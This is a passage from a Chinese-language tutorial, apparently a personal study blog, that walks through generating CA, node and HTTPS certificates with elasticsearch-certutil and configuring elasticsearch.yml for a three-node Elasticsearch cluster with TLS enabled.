数据的目录"></a>2.1.12. 创建存放 ES 数据的目录</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mkdir -p <span class="hljs-regexp">/mystudy/</span>es<span class="hljs-regexp">/elasticsearch/</span>data<br></code></pre></td></tr></table></figure><hr><h5 id="2-1-13-生成-SSL-证书"><a href="#2-1-13-生成-SSL-证书" class="headerlink" title="2.1.13. 生成 SSL 证书"></a>2.1.13. 生成 SSL 证书</h5><h6 id="2-1-13-1-创建存放证书的目录"><a href="#2-1-13-1-创建存放证书的目录" class="headerlink" title="2.1.13.1. 创建存放证书的目录"></a>2.1.13.1. 创建存放证书的目录</h6><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mkdir -p /mystudy/es/elasticsearch/config/certs<br></code></pre></td></tr></table></figure><hr><h6 id="2-1-13-2-生成-CA-证书（CA-私钥和-CA-公钥）、CA-公钥"><a href="#2-1-13-2-生成-CA-证书（CA-私钥和-CA-公钥）、CA-公钥" class="headerlink" title="2.1.13.2. 生成 CA 证书（CA 私钥和 CA 公钥）、CA 公钥"></a>2.1.13.2. 生成 CA 证书（CA 私钥和 CA 公钥）、CA 公钥</h6><p>Elasticsearch 要通过 HTTPS 提供服务，因此若要让用户正常访问 <code>https://192.168.136.8:9200</code>，就需要为其配置一份 HTTPS 证书，且该证书中必须包含 IP 地址 <code>192.168.136.8</code>。</p><p>尽管我们可以手动生成自签名证书，Elasticsearch 也提供了更便捷的工具来自动生成 HTTPS 证书。这个工具的第一步是生成一个 CA 证书。需要注意，这个 CA 证书不仅仅包含公钥，还包含私钥，和我们平常所说的“仅包含公钥”的 CA 根证书有所不同。</p><p>关于 CA 证书的去向：我们在决定 CA 证书的去向前，必须先明确它包含了 CA 公钥和 CA 私钥，其中 CA 私钥是用来签署其他证书的，签完后一般不会再用，但极其重要，不能泄露，所以不能将包含私钥的 CA 证书放入项目中，而 CA 公钥是用来验证其他证书是否由该 CA 签发的，经常需要用到，因此我们应当将 CA 公钥从 CA 证书中导出用于使用，而原始 CA 证书则需要妥善保管。</p><p>这个操作可以在任意一台节点上完成，比如在 es-node1 上执行即可。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 1. 进入 ES 目录</span><br>cd <span class="hljs-regexp">/mystudy/</span>es/elasticsearch<br><br><span class="hljs-comment"># 2. 签发 ca 证书</span><br>sudo bin/elasticsearch-certutil ca<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 要求输入：</span><br><span class="hljs-string">1. Please enter the desired output file [elastic-stack-ca.p12]:</span><br><span class="hljs-string">1. 让你设置证书文件名</span><br><span class="hljs-string">2. 我们直接 Enter，他会默认使用 elastic-stack-ca.p12</span><br><span class="hljs-string">2. Enter password for elastic-stack-ca.p12:</span><br><span class="hljs-string">1. 让你为 CA 证书设置一个密码</span><br><span class="hljs-string">2. 这里不设置</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-comment"># 3. 导出 CA 公钥</span><br>openssl pkcs12 -<span class="hljs-keyword">in</span> elastic-stack-ca.p12 -nokeys -out ca.crt<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 要求输入：</span><br><span class="hljs-string">1. Enter Import Password</span><br><span class="hljs-string">1. 让你输入 CA 证书的密码</span><br><span class="hljs-string">2. 这里不填写</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-comment"># 4. 将 CA 证书、CA 公钥放到存放证书目录下</span><br>mv elastic-stack-ca.p12 ca.crt config/certs<br></code></pre></td></tr></table></figure><hr><h6 id="2-1-13-3-签发节点证书"><a href="#2-1-13-3-签发节点证书" class="headerlink" title="2.1.13.3. 签发节点证书"></a>2.1.13.3. 签发节点证书</h6><p>由于 Elasticsearch 强调分布式节点间的安全通信，要求各节点使用节点证书实现双向认证和数据加密，因此我们需要为节点生成证书。</p><p>这一操作可以在任意拥有 CA 私钥的节点上执行，而我们的 CA 私钥保存在 es-node1，所以就在 es-node1 上完成。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-section"># 1. 进入 ES 目录</span><br>cd /mystudy/es/elasticsearch<br><br><br><span class="hljs-section"># 2. 批量签发节点证书</span><br><br><span class="hljs-section"># 2.1. 创建并编辑 instances.yml（书写节点信息）</span><br>vim instances.yml<br>&quot;&quot;&quot;<br><span class="hljs-bullet">1.</span> 模版写法<br>instances:<br><span class="hljs-bullet">  -</span> name: es-node1<br><span class="hljs-code">    dns: [es-node.example.com]</span><br><span class="hljs-code">    ip:  [192.168.136.8, 192.168.136.9, 192.168.136.10]</span><br><span class="hljs-code">  - name: es-node2</span><br><span class="hljs-code">    dns: [es-node.example.com]</span><br><span class="hljs-code">    ip:  [192.168.136.8, 192.168.136.9, 192.168.136.10]</span><br><span class="hljs-code">  - name: es-node3</span><br><span class="hljs-code">    dns: [es-node.example.com]</span><br><span class="hljs-code">    ip:  [192.168.136.8, 192.168.136.9, 192.168.136.10]</span><br><span class="hljs-code"></span><br><span class="hljs-bullet">2.</span> 我的写法<br>instances:<br><span class="hljs-bullet">  -</span> name: es-node1<br><span class="hljs-code">    ip:  [192.168.136.8]</span><br><span class="hljs-code">  - name: es-node2</span><br><span class="hljs-code">    ip:  [192.168.136.9]</span><br><span class="hljs-code">  - name: es-node3</span><br><span class="hljs-code">    ip:  [192.168.136.10]</span><br><span class="hljs-code">&quot;&quot;&quot;</span><br><span class="hljs-code"></span><br><span class="hljs-section"># 2.2. 进行批量签发</span><br>bin/elasticsearch-certutil cert \<br>  --silent \<br>  --in instances.yml \<br>  --ca config/certs/elastic-stack-ca.p12 \<br>  --pem \<br>  --out certs.zip<br>&quot;&quot;&quot;<br><span class="hljs-bullet">1.</span> 参数说明：<br><span class="hljs-bullet">1.</span> --silent：<br><span class="hljs-bullet">1.</span> 不加 --silent 时，如果某些参数没写，会提示你输入<br><span class="hljs-bullet">2.</span> 加了 --silent 时，不输出任何交互提示或额外信息，如果参数不完整会直接失败<br><span class="hljs-bullet">2.</span> --in：<br><span class="hljs-bullet">1.</span> 从 YAML 中读取节点列表<br><span class="hljs-bullet">3.</span> --ca config/certs/elastic-stack-ca.p12：<br><span class="hljs-bullet">1.</span> CA 私钥的位置，这里使用 CA 证书<br><span class="hljs-bullet">4.</span> --pem：<br><span class="hljs-bullet">1.</span> 输出 PEM 格式的节点证书和节点私钥<br><span class="hljs-bullet">5.</span> --out certs.zip<br><span class="hljs-bullet">1.</span> 输出为 certs.zip<br><span class="hljs-bullet">2.</span> 解压后有多个文件夹，例如 es-node1、es-node2、es-node3<br><span class="hljs-bullet">3.</span> 每个文件夹中都有独自的节点证书和节点私钥，例如 es-node1.key、es-node1.crt<br><span class="hljs-bullet">2.</span> 要求输入：<br><span class="hljs-bullet">1.</span> Enter password for CA (config/certs/elastic-stack-ca.p12)：<br><span class="hljs-bullet">1.</span> 让你输入 CA 证书的密码<br><span class="hljs-bullet">2.</span> 这里不填写<br>&quot;&quot;&quot;&quot;<br><br><span class="hljs-section"># 2.3. 将 certs.zip 放到存放证书目录下，到时候与 HTTPS 证书一起处理</span><br>mv certs.zip config/certs<br><br><br><span class="hljs-section"># 3. 单独为节点进行签发</span><br><span class="hljs-section"># 3.1. 进行单独签发</span><br>bin/elasticsearch-certutil cert \<br>  --name es-node1 \<br>  --dns es-node1 \<br>  --ip 192.168.136.8 \<br>  --ca config/certs/elastic-stack-ca.p12 \<br>  --out es-node1.zip<br>&quot;&quot;&quot;<br><span class="hljs-bullet">1.</span> 要求输入：<br><span class="hljs-bullet">1.</span> Enter password for CA (config/certs/elastic-stack-ca.p12)：<br><span class="hljs-bullet">1.</span> 让你输入 CA 证书的密码<br><span class="hljs-bullet">2.</span> 这里不填写<br><span class="hljs-bullet">2.</span> Enter password for es-node1.zip：<br><span class="hljs-bullet">1.</span> 让你输入 es-node1.zip 的加密密码<br><span class="hljs-bullet">2.</span> 只有输入你刚设的密码才能解压，我们直接 Enter<br>&quot;&quot;&quot;<br><br><span class="hljs-section"># 3.3. 将 certs.zip 放到存放证书目录下，到时候与 HTTPS 证书一起处理</span><br>mv es-node1.zip config/certs<br></code></pre></td></tr></table></figure><hr><h6 id="2-1-13-4-签发-HTTPS-证书"><a href="#2-1-13-4-签发-HTTPS-证书" class="headerlink" title="2.1.13.4. 签发 HTTPS 证书"></a>2.1.13.4. 签发 HTTPS 证书</h6><p>这一操作可以在任意拥有 CA 私钥的节点上执行，而我们的 CA 私钥保存在 es-node1，所以同样在 es-node1 上完成。</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs stata"># 1. 进入 ES 目录<br><span class="hljs-keyword">cd</span> /mystudy/es/elasticsearch<br><br><br># 2. 批量签发 HTTPS 证书<br><br># 2.1. 创建并编辑 http-instances.yml<br>vim http-instances.yml<br><span class="hljs-string">&quot;&quot;</span>&quot;<br>1. 模版写法<br>instances:<br>  - name: es-node1-http<br>    dns: [ <span class="hljs-string">&quot;es-node1&quot;</span> ]<br>    ip:  [ <span class="hljs-string">&quot;192.168.136.8&quot;</span> ]<br>  - name: es-node2-http<br>    dns: [ <span class="hljs-string">&quot;es-node2&quot;</span> ]<br>    ip:  [ <span class="hljs-string">&quot;192.168.136.9&quot;</span> ]<br>  - name: es-node3-http<br>    dns: [ <span class="hljs-string">&quot;es-node3&quot;</span> ]<br>    ip:  [ <span class="hljs-string">&quot;192.168.136.10&quot;</span> ]<br><br>2.我的写法<br>instances:<br>  - name: es-node1-http<br>    ip:  [ <span class="hljs-string">&quot;192.168.136.8&quot;</span> ]<br>  - name: es-node2-http<br>    ip:  [ <span class="hljs-string">&quot;192.168.136.9&quot;</span> ]<br>  - name: es-node3-http<br>    ip:  [ <span class="hljs-string">&quot;192.168.136.10&quot;</span> ]<br><span class="hljs-string">&quot;&quot;</span>&quot;<br><br># 2.2. 进行批量签发<br>bin/elasticsearch-certutil cert \<br>  --silent \<br>  --<span class="hljs-keyword">in</span> http-instances.yml \<br>  --<span class="hljs-keyword">ca</span>  config/certs/elastic-<span class="hljs-keyword">stack</span>-<span class="hljs-keyword">ca</span>.p12 \<br>  --pem \<br>  --<span class="hljs-keyword">out</span> http-certs.<span class="hljs-keyword">zip</span><br><span class="hljs-string">&quot;&quot;</span>&quot;<br>1. 要求输入：<br>1. Enter password <span class="hljs-keyword">for</span> <span class="hljs-keyword">CA</span> (config/certs/elastic-<span class="hljs-keyword">stack</span>-<span class="hljs-keyword">ca</span>.p12)：<br>1. 让你输入 <span class="hljs-keyword">CA</span> 证书的密码<br>2. 这里不填写<br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><br><br># 2.3. 将 http-certs.<span class="hljs-keyword">zip</span> 放到存放证书目录下，到时候与 节点 证书一起处理<br>mv http-certs.<span class="hljs-keyword">zip</span> config/certs<br><br><br># 3. 单独为节点进行签发<br># 3.1. 进行单独签发<br>bin/elasticsearch-certutil cert \<br>  --name es-node1 \<br>  --dns es-node1 \<br>  --ip 192.168.136.8 \<br>  --<span class="hljs-keyword">ca</span> config/certs/elastic-<span class="hljs-keyword">stack</span>-<span class="hljs-keyword">ca</span>.p12 \<br>  --pem \<br>  --<span class="hljs-keyword">out</span> es-node1-https.<span class="hljs-keyword">zip</span><br><span class="hljs-string">&quot;&quot;</span>&quot;<br>1. 要求输入：<br>1. Enter password <span class="hljs-keyword">for</span> <span class="hljs-keyword">CA</span> (config/certs/elastic-<span class="hljs-keyword">stack</span>-<span class="hljs-keyword">ca</span>.p12)：<br>1. 让你输入 <span class="hljs-keyword">CA</span> 证书的密码<br>2. 这里不填写<br>2. Enter password <span class="hljs-keyword">for</span> es-node3.<span class="hljs-keyword">zip</span>：<br>1. 让你输入 es-node1.<span class="hljs-keyword">zip</span> 的加密密码<br>2. 只有输入你刚设的密码才能解压，我们直接 Enter<br><span class="hljs-string">&quot;&quot;</span>&quot;<br><br># 3.3. 将 http-certs.<span class="hljs-keyword">zip</span> 放到存放证书目录下，到时候与 节点 证书一起处理<br>mv es-node1.<span class="hljs-keyword">zip</span> config/certs<br></code></pre></td></tr></table></figure><hr><h6 id="2-1-13-5-分发证书"><a href="#2-1-13-5-分发证书" class="headerlink" title="2.1.13.5. 分发证书"></a>2.1.13.5. 分发证书</h6><ol><li>&#x3D;&#x3D;CA 证书&#x3D;&#x3D;：<ol><li>由于 CA 证书中包含 CA 私钥，因此我们需要妥善保管，等到下次需要签发新证书时再取出来使用，否则就让它静静躺在仓库里“吃灰”吧。  </li><li>你可能会问，那我验证这些证书是不是由本 CA 签发的，不也得有 CA 公钥吗？是的，CA 证书中确实同时包含了私钥和公钥。虽然私钥要严密保存，但没有公钥也不行。  </li><li>别担心，我们在生成节点证书的时候，已经从 CA 证书中提取了公钥部分，也就是 <code>ca.crt</code> 文件，这就是 CA 的公钥，用这个来验证签名就可以了。</li></ol></li><li>&#x3D;&#x3D;CA 公钥（ca.crt）&#x3D;&#x3D;：<ol><li>同步到所有节点</li></ol></li><li>&#x3D;&#x3D;节点证书&#x3D;&#x3D;<ol><li>各节点就用自己证书。比如 <code>es-node1</code> 的证书，别传给 <code>es-node2</code> 去用，各用各的，别串。</li></ol></li><li>&#x3D;&#x3D;HTTPS 证书&#x3D;&#x3D;：<ol><li>同样是各节点使用自己的证书，各用各的，别串。<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs gradle"># <span class="hljs-number">1</span>. 进入存放证书的目录<br>cd <span class="hljs-regexp">/mystudy/</span>es<span class="hljs-regexp">/elasticsearch/</span>config/certs<br><br><br># <span class="hljs-number">2</span>. 将 CA 证书好好保管，以后需要签发证书再拿出来<br><br><br># <span class="hljs-number">3</span>. 解压 节点 证书，分配到各自服务器的 <span class="hljs-regexp">/mystudy/</span>es<span class="hljs-regexp">/elasticsearch/</span>config/certs 目录下<br>unzip certs.zip <br><br><br># <span class="hljs-number">4</span>. 解压 HTTPS 证书，分配到各自服务器的 <span class="hljs-regexp">/mystudy/</span>es<span class="hljs-regexp">/elasticsearch/</span>config/certs 目录下<br>unzip http-certs.zip<br><br><br># <span class="hljs-number">5</span>. 将 CA 公钥（ca.crt）分配到每个服务器的 <span class="hljs-regexp">/mystudy/</span>es<span class="hljs-regexp">/elasticsearch/</span>config/certs 目录下<br></code></pre></td></tr></table></figure></li></ol></li></ol><hr><h5 id="2-1-14-修改-ES-文件拥有者为-es"><a href="#2-1-14-修改-ES-文件拥有者为-es" class="headerlink" title="2.1.14. 修改 ES 文件拥有者为 es"></a>2.1.14. 修改 ES 文件拥有者为 es</h5><p>因为要启动 ES 了，所以7要将 ES 文件拥有者设置为 es，用 es 用户启动 ES</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">chown -R <span class="hljs-built_in">es</span>:<span class="hljs-built_in">es</span> /mystudy/<span class="hljs-built_in">es</span>/elasticsearch<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>为用户设置密码时，两次回车键就是无密码</li></ol></blockquote><hr><h5 id="2-1-15-启动第一个-ES"><a href="#2-1-15-启动第一个-ES" class="headerlink" title="2.1.15. 启动第一个 ES"></a>2.1.15. 启动第一个 ES</h5><h6 id="2-1-15-1-前言"><a href="#2-1-15-1-前言" class="headerlink" title="2.1.15.1. 前言"></a>2.1.15.1. 前言</h6><p>第一个 ES的启动至关重要，因为要初始化 ES 集群的元数据状态，后续要加入集群的节点也要找第一个节点当做中间人。</p><hr><h6 id="2-1-15-2-配置主配置文件：config-elasticsearch-yml"><a href="#2-1-15-2-配置主配置文件：config-elasticsearch-yml" class="headerlink" title="2.1.15.2. 配置主配置文件：config&#x2F;elasticsearch.yml"></a>2.1.15.2. 配置主配置文件：config&#x2F;elasticsearch.yml</h6><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-comment"># 1. 修改 ES 配置文件</span><br><span class="hljs-attribute">vim /mystudy/es/elasticsearch/config/elasticsearch.yml</span><br><span class="hljs-attribute">&quot;&quot;&quot;</span><br><span class="hljs-attribute">1. 注解版本</span><br><span class="hljs-attribute"># ================== 基础配置 ==================</span><br><span class="hljs-attribute"># 设置 ES 集群名称</span><br><span class="hljs-attribute">cluster.name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">es-cluster                           # 同集群内的所有节点，集群名称必须一致</span><br><br><span class="hljs-comment"># 设置当前节点名称</span><br><span class="hljs-attribute">node.name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">es-node1                                # 每个 ES 节点在 ES 集群中唯一的名字（不必须主机名，但推荐）</span><br><br><span class="hljs-comment"># 设置数据和日志文件路径</span><br><span class="hljs-attribute">path.data</span><span class="hljs-punctuation">:</span> <span class="hljs-string">/mystudy/es/elasticsearch/data</span><br><span class="hljs-attribute">path.logs</span><span class="hljs-punctuation">:</span> <span class="hljs-string">/mystudy/es/elasticsearch/log</span><br><br><span class="hljs-comment"># 设置网络访问地址和端口</span><br><span class="hljs-attribute">network.host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">                                     # 配置 Elasticsearch 监听的网卡地址，影响 HTTP（9200）和节点通信（9300）</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">_local_</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">_site_      </span><br><span class="hljs-attribute">http.port</span><span class="hljs-punctuation">:</span> <span class="hljs-string">9200                                    # HTTP 接口已默认使用 9200 端口，如果需要更换可在此修改；</span><br><span class="hljs-attribute">http.host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">[&quot;_local_&quot;, &quot;_site_&quot;]                   # 进一步细化 HTTP 的监听地址，会覆盖 network.host 的 HTTP 设置，通常无需单独配置 http.host，除非你希望 HTTP 和 Transport 分别绑定在不同的地址（如 HTTP 对外暴露，Transport 用于内网通信）</span><br><br><span class="hljs-comment"># 设置初始发现节点（后续节点加入集群中，需要这些节点作为中间人）</span><br><span class="hljs-attribute">discovery.seed_hosts</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;192.168.136.8&quot;</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;192.168.136.9&quot;</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;192.168.136.10&quot;</span><br><br><span class="hljs-comment"># 指定集群初始化主节点名称</span><br><span class="hljs-attribute">cluster.initial_master_nodes</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;es-node1&quot;                                      # 需注意，应填节点名称，不能填写 IP、主机名，并且只需要在第一个节点启动时指定。是用于指定集群初始化时的主节点，负责创建和初始化集群的元数据。一旦集群稳定并完成初始化后，该配置将不再起作用，随后通过内部选举选出的主节点将接管</span><br><br><span class="hljs-comment"># ================== 安全配置 ==================</span><br><span class="hljs-comment"># 开启安全认证</span><br><span class="hljs-attribute">xpack.security.enabled</span><span class="hljs-punctuation">:</span> <span class="hljs-string">true                        # 启用后，要使用 ES 内置的用户和角色进行身份验证才能访问集群资源。</span><br><span class="hljs-attribute">xpack.security.enrollment.enabled</span><span class="hljs-punctuation">:</span> <span class="hljs-string">true             # 启用后，开启节点间安全通信和身份验证</span><br><br><span class="hljs-comment"># 配置 HTTPS（HTTP 层 SSL）</span><br><span class="hljs-attribute">xpack.security.http.ssl</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">enabled</span><span class="hljs-punctuation">:</span> <span class="hljs-string">true</span><br>  <span class="hljs-attribute">certificate</span><span class="hljs-punctuation">:</span> <span class="hljs-string">/mystudy/es/elasticsearch/config/certs/es-node1-http.crt</span><br>  <span class="hljs-attribute">key</span><span class="hljs-punctuation">:</span> <span class="hljs-string">/mystudy/es/elasticsearch/config/certs/es-node1-http.key</span><br>  <span class="hljs-attribute">certificate_authorities</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">/mystudy/es/elasticsearch/config/certs/ca.crt</span><br>  <span class="hljs-attribute">client_authentication</span><span class="hljs-punctuation">:</span> <span class="hljs-string">none                       # 是否要求客户端上传证书</span><br>   <br><span class="hljs-comment"># 配置节点间通信加密（Transport 层 SSL）</span><br><span class="hljs-attribute">xpack.security.transport.ssl</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">enabled</span><span class="hljs-punctuation">:</span> <span class="hljs-string">true</span><br>  <span class="hljs-attribute">verification_mode</span><span class="hljs-punctuation">:</span> <span class="hljs-string">certificate</span><br>  <span class="hljs-attribute">certificate</span><span class="hljs-punctuation">:</span> <span class="hljs-string">/mystudy/es/elasticsearch/config/certs/es-node1.crt</span><br>  <span class="hljs-attribute">key</span><span class="hljs-punctuation">:</span> <span class="hljs-string">/mystudy/es/elasticsearch/config/certs/es-node1.key</span><br>  <span class="hljs-attribute">certificate_authorities</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">/mystudy/es/elasticsearch/config/certs/ca.crt</span><br><br><span class="hljs-attribute">2. 精简版本</span><br><span class="hljs-attribute"># 集群与节点</span><br><span class="hljs-attribute">cluster.name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">es-cluster</span><br><span class="hljs-attribute">node.name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">es-node1</span><br><br><span class="hljs-comment"># 存储路径</span><br><span class="hljs-attribute">path.data</span><span class="hljs-punctuation">:</span> <span class="hljs-string">/mystudy/es/elasticsearch/data</span><br><span class="hljs-attribute">path.logs</span><span class="hljs-punctuation">:</span> <span class="hljs-string">/mystudy/es/elasticsearch/log</span><br><br><span class="hljs-comment"># 网络配置</span><br><span class="hljs-attribute">network.host</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">_local_</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">_site_</span><br><span class="hljs-attribute">http.port</span><span class="hljs-punctuation">:</span> <span class="hljs-string">9200</span><br><br><span class="hljs-comment"># 集群发现</span><br><span class="hljs-attribute">discovery.seed_hosts</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;192.168.136.8&quot;</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;192.168.136.9&quot;</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;192.168.136.10&quot;</span><br><span class="hljs-attribute">cluster.initial_master_nodes</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;es-node1&quot;</span><br><br><span class="hljs-comment"># 可选：关闭 GeoIP 自动下载</span><br><span class="hljs-attribute">ingest.geoip.downloader.enabled</span><span class="hljs-punctuation">:</span> <span class="hljs-string">false</span><br><br><span class="hljs-comment"># 安全配置</span><br><span class="hljs-attribute">xpack.security.enabled</span><span 